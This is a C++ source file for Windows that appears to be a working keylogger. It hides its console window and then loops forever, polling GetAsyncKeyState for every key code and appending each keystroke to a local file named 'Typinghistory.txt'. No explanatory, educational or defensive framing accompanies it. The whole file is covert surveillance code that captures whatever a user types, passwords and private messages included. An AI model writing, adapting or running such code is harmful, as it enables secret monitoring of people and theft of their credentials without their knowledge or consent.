#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

void StartLogging();

int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    StartLogging();
    return 0;
}

void StartLogging(){
    char c;
    while (true) {
        for(c=1;c<=254;c++){
            if(GetAsyncKeyState(c) &  0x1 ) {
                ofstream log;
                log.open("Typinghistory.txt", ios::app);
                switch (c) {
                    case VK_BACK:
                        log << "<-";
                        break;
                    case VK_RETURN:
                        log << "\n";
                        break;
                    case VK_SHIFT:
                        log << "";
                        break;
                    case VK_CONTROL:
                        log << "";
                        break;
                    case VK_CAPITAL:
                        log << "";
                        break;
                    case VK_TAB:
                        log << "";
                        break;
                    case VK_MENU:
                        log << "";
                    case VK_LBUTTON:
                    case VK_RBUTTON:
                        break;
                    default:
                        log << c;
                }
                log.close();
            }
        }
    }
}
